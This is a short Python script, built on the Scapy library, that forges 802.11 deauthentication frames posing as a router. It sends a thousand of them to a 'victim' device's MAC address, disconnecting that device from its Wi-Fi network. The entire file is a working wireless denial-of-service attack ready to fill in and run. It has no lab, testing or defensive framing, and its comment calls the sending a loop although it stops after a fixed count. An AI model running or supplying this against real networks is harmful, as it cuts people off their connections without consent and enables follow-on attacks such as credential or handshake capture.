from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

# Target and Access Point MAC addresses
target_mac = ""  # Replace with theVictim's MAC address
ap_mac = ""  # Replace with the router's MAC address

# Create deauthentication packet
packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)

# Send packets in a loop (Use Ctrl+C to stop)
print("Sending deauthentication packets...")
sendp(packet, inter=0.1, count=1000, iface="Wi-Fi", verbose=1)
